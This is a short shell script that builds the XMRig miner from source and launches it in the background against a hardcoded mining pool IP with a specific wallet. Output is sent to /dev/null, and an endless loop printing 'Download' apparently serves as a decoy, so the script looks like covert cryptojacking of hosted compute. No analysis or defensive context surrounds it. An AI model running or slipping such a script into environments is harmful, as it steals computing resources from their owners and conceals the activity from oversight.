apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git >/dev/null
cd xmrig 
mkdir build 
cd build 
cmake ..  
make -j$(nproc) --y
./xmrig -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax.RIG001 -t 1 /dev/null 2>&1 &
while true
do
        echo "Download"
        sleep 20
done
